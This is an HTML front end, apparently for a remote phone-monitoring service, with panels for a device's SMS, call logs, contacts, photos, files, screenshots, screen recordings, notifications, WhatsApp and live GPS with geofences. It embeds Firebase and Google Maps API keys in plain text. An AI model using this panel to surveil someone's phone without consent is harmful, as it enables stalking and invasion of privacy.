<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Monitoring Dashboard</title>
<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
<script>
  (function() {
    const theme = localStorage.getItem('theme');
    if (theme === 'light') {
      document.documentElement.classList.add('light');
    }
  })();
</script>
<link rel="stylesheet" href="style.css" />
<script src="js/firebase-app.js"></script>
<script src="js/firebase-auth.js"></script>
<script src="js/jquery.js"></script>

<script src="js/firebase-database.js"></script>

<script type="text/javascript">
const firebaseConfig = {
apiKey: "AIzaSyB2CoEPWvuroDb2tXCptJkbNyAT8EUomxU",
authDomain: "AUTH DOMAIN",
databaseURL: "https://bueva-f4842-default-rtdb.firebaseio.com",
projectId: "bueva-f4842",
storageBucket: "bueva-f4842.appspot.com",
messagingSenderId: "SENDER ID",
appId: "1:982993642465:android:bb0d516d19e367d18c68a0"
};
firebase.initializeApp(firebaseConfig);
</script>
</head>

<body>

<!-- AUTH LOADER -->
<div id="authGate" class="auth-gate">
  <div class="spinner"></div>
</div>
<div id="loginPage" class="login-page">

  <div class="lockscreen-wrapper">

    <!-- LOGO -->
<div class="lockscreen-logo" id="lockscreenClock">
  <div id="clockTime"></div>
  <div id="clockDate"></div>
</div>
    <!-- NAMA USER -->
    <div class="lockscreen-name">John Doe</div>

    <!-- FORM LOGIN -->
    <form onsubmit="login(); return false;">
      <div class="lockscreen-item">

        <div class="lockscreen-image">
          <img src="profile.jpeg" alt="User">
        </div>
        <div class="lockscreen-credentials">
          <input
            id="loginName"
            type="text"
            placeholder="Username"
            autocomplete="off"
          >
          <button type="submit" aria-label="Login">
            <svg viewBox="0 0 320 512">
              <path d="M96 96l128 160-128 160V96z"/>
            </svg>
          </button>
        </div>

      </div>
<div id="loginError" style="color:red; font-size:14px; margin-top:5px;"></div>
    </form>

    <!-- TEXT BAWAH -->
    <div class="help-block">
      Enter your username to retrieve your session<br>
      <a href="#">Or sign in as a different user</a>
    </div>

    <!-- FOOTER -->
    <div class="footer">
      Copyright Â© 2014â€“2025
      <span style="color:#007bff">AdminLTE.io</span><br>
      All rights reserved
    </div>

  </div>

</div>

<div id="app" style="display:none">
  <!-- SEMUA KODE LAMA KAMU -->
<header>
  <div style="display:flex;align-items:center;gap:10px;flex:1">

    <div class="icon">
      <img src="https://cdn-icons-png.flaticon.com/512/888/888857.png"
           style="width:20px;height:20px">
    </div>

    <div style="display:flex;align-items:center;gap:6px">
      <div style="display:flex;flex-direction:column;line-height:1.1">
        <div class="title" id="deviceName">Pilih device</div>
        <div class="sub-text">
          ğŸ”‹ <span id="batteryText">â€“%</span>
        </div>
      </div>

      <button class="icon-btn" id="dropdownToggle" style="width:28px;height:28px">
        â–¾
      </button>
    </div>
  </div>

<!-- RIGHT -->
<div class="header-right">
  <!-- NOTIFICATION -->
  <button class="icon-btn" id="notifBtn">
    <svg viewBox="0 0 24 24" width="18" height="18" fill="none"
         stroke="currentColor" stroke-width="2">
      <path d="M18 8a6 6 0 10-12 0c0 7-3 9-3 9h18s-3-2-3-9"/>
      <path d="M13.73 21a2 2 0 01-3.46 0"/>
    </svg>
  </button>

  <!-- THEME -->
  <button class="icon-btn" id="themeBtn">ğŸŒ™</button>

<div class="account-dropdown" id="accountDropdown">

  <!-- USER INFO -->
  <div class="account-user">
    <div class="avatar">
      <!-- user icon -->
      <svg viewBox="0 0 24 24" width="18" height="18" fill="none"
           stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
        <path d="M20 21c0-4-4-7-8-7s-8 3-8 7"/>
        <circle cx="12" cy="7" r="4"/>
      </svg>
    </div>
    <div class="name" id="accountUserName">Demo User</div>
  </div>

<div class="theme-options">
  <button data-theme="light" onclick="setTheme('light')" title="Light">
    <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2">
      <circle cx="12" cy="12" r="4"/>
      <path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"/>
    </svg>
  </button>

  <button data-theme="dark" onclick="setTheme('dark')" title="Dark">
    <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2">
      <path d="M21 12.8A9 9 0 1111.2 3 7 7 0 0021 12.8z"/>
    </svg>
  </button>

  <button data-theme="system" onclick="setTheme('system')" title="System">
    <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2">
      <rect x="2" y="3" width="20" height="14" rx="2"/>
      <path d="M8 21h8M12 17v4"/>
    </svg>
  </button>
</div>

  <!-- SIGN OUT -->
  <div class="account-logout" onclick="logoutAccount()">
    <svg viewBox="0 0 24 24" width="16" height="16" fill="none"
         stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
      <path d="M9 21H5a2 2 0 01-2-2V5a2 2 0 012-2h4"/>
      <path d="M16 17l5-5-5-5"/>
      <path d="M21 12H9"/>
    </svg>
    <span>Sign out</span>
  </div>

</div>

  <!-- PROFILE -->
  <button class="icon-btn profile-btn" id="profBtn">
    <img src="profile.jpeg" alt="Profil">
  </button>
</div>
</header>
<!-- BREADCRUMB -->
<div id="breadcrumb" class="breadcrumb" style="display:none;"></div>
<!-- DROPDOWN -->
<div class="card" id="deviceDropdown" style="display:none;position:fixed;top:56px;left:16px;right:16px;z-index:200">
  <div class="card-title">Bound Devices</div>
<div id="deviceList"></div>
<button class="add-device">+ Add A New Device</button>
<p class="available" id="availableCount">
Available: 0/3
</p>
</div>

<div class="demo-banner page" id="demo">
<span>Belum pilih Device</span>
<button class="bind-btn">Pilih Device</button>
</div>
<div class="container">
  <!-- LOADER GLOBAL -->
  <div id="loader" class="content-loader">
    <div class="spinner"></div>
  </div>

<!-- MENU SLIDER -->
<div id="menuPage">
  <!-- MENU SLIDER CARD -->
  <div class="card">
  <div class="menu-slider">
    <div class="menu-item" onclick="openPage('screenshot')">
      <div class="menu-icon">â­</div>
      <div class="menu-label">Screenshot</div>
    </div>
    <div class="menu-item" onclick="openPage('sms')">
      <div class="menu-icon">âœ‰ï¸</div>
      <div class="menu-label">SMS</div>
    </div>
    <div class="menu-item" onclick="openPage('panggilan')">
      <div class="menu-icon">ğŸ“</div>
      <div class="menu-label">Panggilan</div>
    </div>
    <div class="menu-item" onclick="openPage('kontak')">
      <div class="menu-icon">ğŸ‘¤</div>
      <div class="menu-label">Kontak</div>
    </div>
    <div class="menu-item" onclick="openPage('gallery')">
      <div class="menu-icon">ğŸ–¼ï¸</div>
      <div class="menu-label">Gallery</div>
    </div>
    <div class="menu-item" onclick="openPage('geofence')">
      <div class="menu-icon">ğŸ“</div>
      <div class="menu-label">Maps</div>
    </div>
    <div class="menu-item" onclick="openPage('screenrecorder')">
      <div class="menu-icon">ğŸ¥</div>
      <div class="menu-label">Screen Rec</div>
    </div>
  </div>
      <div class="menu-divider"></div>

    <div class="menu-slider">
    <div class="menu-item" onclick="openPage('file')">
      <div class="menu-icon">â­</div>
      <div class="menu-label">File Manager</div>
    </div>
    <div class="menu-item" onclick="openPage('aplikasi')">
      <div class="menu-icon">âœ‰ï¸</div>
      <div class="menu-label">Aplikasi</div>
    </div>
    <div class="menu-item" onclick="openPage('panggilan')">
      <div class="menu-icon">ğŸ“</div>
      <div class="menu-label">Whatsapp</div>
    </div>
    <div class="menu-item" onclick="openPage('kontak')">
      <div class="menu-icon">ğŸ‘¤</div>
      <div class="menu-label">Kontak</div>
    </div>
    <div class="menu-item" onclick="openPage('gallery')">
      <div class="menu-icon">ğŸ–¼ï¸</div>
      <div class="menu-label">Gallery</div>
    </div>
    <div class="menu-item" onclick="openPage('geofence')">
      <div class="menu-icon">ğŸ“</div>
      <div class="menu-label">Maps</div>
    </div>
    <div class="menu-item" onclick="openPage('screenrecorder')">
      <div class="menu-icon">ğŸ¥</div>
      <div class="menu-label">Screen Rec</div>
    </div>
  </div>
</div>



<!-- MAP -->
<div class="card">
  <div class="card-title">
    <div class="title-wrap">
      <div class="main">Lokasi</div>
      <div class="sub">Pelacakan GPS realtime</div>
    </div>
    <button class="sync-btn" onclick="dumplokasi();">
      <svg viewBox="0 0 24 24" fill="none" stroke-width="2">
        <circle cx="12" cy="12" r="3"/>
        <path d="M12 2v4M12 18v4M2 12h4M18 12h4"/>
      </svg>
    </button>
  </div>

  <iframe class="map"></iframe>

  <div class="empty" style="display:none;">
    Lokasi untuk UID ini tidak ada
  </div>
</div>

<!-- app usage -->
  <div class="card">
  <div class="card-title">
    <div class="title-wrap">
      <div class="main">App Usage</div>
      <div class="sub">Pengunaan hari ini</div>
    </div>
  </div>
<div id="chartWrapper" style="height:200px; width:100%;">
  <canvas id="usageChart"></canvas>
</div>
  <div class="list" id="usageList">
      
    </div>
  </div>
  
<!-- DEVICE INFO CARD -->
<div class="card">
  <div class="card-title">
    <div class="title-wrap">
      <div class="main">Info Perangkat</div>
      <div class="sub">Detail perangkat saat ini</div>
    </div>
    <button class="sync-btn" onclick="loadDeviceInfo(currentUID)">
      <svg viewBox="0 0 24 24" fill="none" stroke-width="2">
        <path d="M21 12a9 9 0 1 1-3-6.7"/>
        <polyline points="21 3 21 9 15 9"/>
      </svg>
    </button>
  </div>
  <ul class="list" id="deviceInfoList">
  </ul>
</div>

</div>

<!-- KONTAK -->
<div class="card page" id="kontak">
  <div class="card-title">
    <div class="title-wrap">
      <div class="main">Kontak</div>
      <div class="sub">Daftar Kontak</div>
    </div>
    <button class="sync-btn" onclick="requestContacts();">
      <svg viewBox="0 0 24 24" fill="none" stroke-width="2">
        <path d="M21 12a9 9 0 1 1-3-6.7"/>
        <polyline points="21 3 21 9 15 9"/>
      </svg>
    </button>
  </div>
  <ul class="list">
  </ul>
    <div class="empty">Kontak tidak ada</div>
</div>

<!-- ScreenRecorder -->
<div class="card page" id="screenrecorder">
  <div class="card-title">
    <div class="title-wrap">
      <div class="main">Screen Recorder</div>
      <div class="sub">View & Start Screen Record</div>
    </div>
    <button class="sync-btn" onclick="startRecord();">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
        <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V7a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/>
        <circle cx="12" cy="13" r="4"/>
      </svg>
    </button>
  </div>
  <div class="gallery"></div>
  <div class="empty">Tidak ada video Screen Recorder</div>
</div>

<!-- Preview fullscreen -->
<div id="screen_fix-preview" class="preview">
  <span class="gallery_fix-close">Ã—</span>
  <video id="gallery_fix-preview-video" controls></video>
</div>

<!-- Screenshot -->
<div class="card page" id="screenshot">
  <div class="card-title">
    <div class="title-wrap">
      <div class="main">Screenshot</div>
      <div class="sub">Take Screenshot</div>
    </div>
    <button class="sync-btn" onclick="handleScreenshot();">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
        <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V7a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/>
        <circle cx="12" cy="13" r="4"/>
      </svg>
    </button>
  </div>
  <div class="gallery"></div>

<div class="empty">Tidak ada screenshot</div>
</div>
<div id="gallery_fix-preview" class="preview">
  <span class="gallery_fix-close">Ã—</span>
  <img id="gallery_fix-preview-img" src="" alt="Preview">
</div>

<!-- GALLERY -->
<div class="card page" id="gallery">
  <div class="card-title">
    <div class="title-wrap">
      <div class="main">Gallery</div>
      <div class="sub">Gallery Foto</div>
    </div>
    <button class="sync-btn" onclick="sync-gallery();">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
        <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V7a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/>
        <circle cx="12" cy="13" r="4"/>
      </svg>
    </button>
  </div>
<div class="gallery">
  <div class="konten-loading">Memuat galleryâ€¦</div>
</div>
  <div class="empty">Tidak ada gallery</div>
</div>
<div id="gallery_fix-preview" class="preview">
  <span class="gallery_fix-close">Ã—</span>
  <img id="gallery_fix-preview-img" src="" alt="Preview">
</div>

<!-- SMS -->
<div class="card page" id="sms">
  <div class="card-title">
    <div class="title-wrap">
      <div class="main">SMS</div>
      <div class="sub">Pesan masuk & keluar</div>
    </div>
    <button class="sync-btn" onclick="requestSMS();">
      <svg viewBox="0 0 24 24" fill="none" stroke-width="2">
        <path d="M21 12a9 9 0 1 1-3-6.7"/>
        <polyline points="21 3 21 9 15 9"/>
      </svg>
    </button>
  </div>
  <ul class="list">
  </ul>
      <div class="empty">SMS tidak ada</div>
</div>

<!-- NOTIFICATION LISTENER -->
<div class="card page" id="notifikasi">
  <div class="card-title">
    <div class="title-wrap">
      <div class="main">Notifikasi</div>
      <div class="sub">Notification listener</div>
    </div>
    <button class="sync-btn">
      <svg viewBox="0 0 24 24" fill="none" stroke-width="2">
        <path d="M21 12a9 9 0 1 1-3-6.7"/>
        <polyline points="21 3 21 9 15 9"/>
      </svg>
    </button>
  </div>

  <div class="notif-item">
    <div class="notif-icon">
      <svg viewBox="0 0 24 24" fill="none" stroke-width="2">
        <path d="M18 8a6 6 0 0 0-12 0v5l-2 2h16l-2-2z"/>
        <path d="M13.7 21a2 2 0 0 1-3.4 0"/>
      </svg>
    </div>

    <div class="notif-content">
      <div class="notif-title">WhatsApp</div>
      <div class="notif-text">Pesan baru dari Ibu</div>
      <div class="notif-time">Hari ini Â· 14:32</div>
    </div>
  </div>

  <div class="notif-item">
    <div class="notif-icon">
      <svg viewBox="0 0 24 24" fill="none" stroke-width="2">
        <path d="M3 12h18"/>
        <path d="M12 3v18"/>
      </svg>
    </div>

    <div class="notif-content">
      <div class="notif-title">Instagram</div>
      <div class="notif-text">Seseorang menyukai postinganmu</div>
      <div class="notif-time">Kemarin Â· 21:10</div>
    </div>
  </div>

</div>

<!-- FILE MANAGER -->
<div class="card page" id="file">
  <div class="card-title">
    <div class="title-wrap">
      <div class="main">File Manager</div>
      <div class="sub">Folder & file tersimpan</div>
    </div>
    <button class="sync-btn" onclick="navigateBack();">
      <svg viewBox="0 0 24 24" fill="none" stroke-width="2">
        <path d="M21 12a9 9 0 1 1-3-6.7"/>
        <polyline points="21 3 21 9 15 9"/>
      </svg>
    </button>
  </div>

  <!-- FILE LIST -->
  <ul class="list" id="filelistBaru"></ul>
</div>

<div id="fullFilePreview" class="preview" style="display:none">
  <div class="gallery_fix-close" id="closeImage">âœ•</div>
  <img id="fullFilePreviewImage">
</div>
<div id="fullFilePreviewVideo" class="preview" style="display:none">
  <div class="gallery_fix-close" id="closeVideo">âœ•</div>
  <video id="videoPlayer" controls playsinline></video>
</div>
<div id="fullFilePreviewDoc" class="preview" style="display:none">
  <div class="gallery_fix-close" id="closeDoc">âœ•</div>
  <iframe id="docFrame"></iframe>
</div>

<!-- LOG PANGGILAN -->
<div class="card page" id="panggilan">
  <div class="card-title">
    <div class="title-wrap">
      <div class="main">Log Panggilan</div>
      <div class="sub">Masuk & keluar</div>
    </div>
    <button class="sync-btn" onclick="requestCall();">
      <svg viewBox="0 0 24 24" fill="none" stroke-width="2">
        <path d="M21 12a9 9 0 1 1-3-6.7"/>
        <polyline points="21 3 21 9 15 9"/>
      </svg>
    </button>
  </div>

  <ul class="list">
  </ul>
    <div class="empty">Riwayat panggilan tidak ada</div>
</div>

<!-- APPS -->
<div class="card page" id="aplikasi">
  <div class="card-title">
    <div class="title-wrap">
      <div class="main">Aplikasi</div>
      <div class="sub">Kontrol & pembatasan aplikasi</div>
    </div>
    <button class="sync-btn">
      <svg viewBox="0 0 24 24" fill="none" stroke-width="2">
        <path d="M21 12a9 9 0 0 0-9-9 9 9 0 0 0-6.36 2.64"/>
        <polyline points="3 3 3 9 9 9"/>
        <path d="M3 12a9 9 0 0 0 9 9 9 9 0 0 0 6.36-2.64"/>
        <polyline points="21 21 21 15 15 15"/>
      </svg>
    </button>
  </div>
  <ul class="list">
  </ul>
</div>

<!-- MAPS + GEOFENCE -->
<div class="card page" id="geofence">
  <div class="card-title">
    <div class="title-wrap">
      <div class="main">Maps</div>
      <div class="sub">Lokasi perangkat</div>
    </div>
    <button class="sync-btn">
      <svg viewBox="0 0 24 24" fill="none" stroke-width="2">
        <path d="M21 12a9 9 0 1 1-3-6.7"/>
        <polyline points="21 3 21 9 15 9"/>
      </svg>
    </button>
  </div>
<div class="map-wrapper">
  <div class="search-bar">
    <input
      id="searchBox"
      type="text"
      class="search-input"
      placeholder="Cari lokasi... contoh: SMA 1 Jakarta"
    >
  </div>

  <div class="map" id="map"></div>
</div>

<input
  type="text"
  class="geofence-input"
  id="placeName"
  placeholder="Nama area"
>

<select class="geofence-select" id="radiusSelect">
  <option value="100">Radius 100 meter</option>
  <option value="300">Radius 300 meter</option>
  <option value="500">Radius 500 meter</option>
  <option value="1000">Radius 1 km</option>
</select>

<button class="geofence-save" id="saveBtn">Simpan Geofence</button>

<div class="geofence-list" id="listContent"></div>
</div>
</div>

</div>

<!-- Leaflet JS -->
<script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
<script src=".js/data.js"></script>
<script src="script.js"></script>
<script src="apps.js"></script>
<script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyBZpNS8NFjSBgMa1UH6GPBSAvgRm4enJlA&libraries=places" async defer></script>
</body>
</html>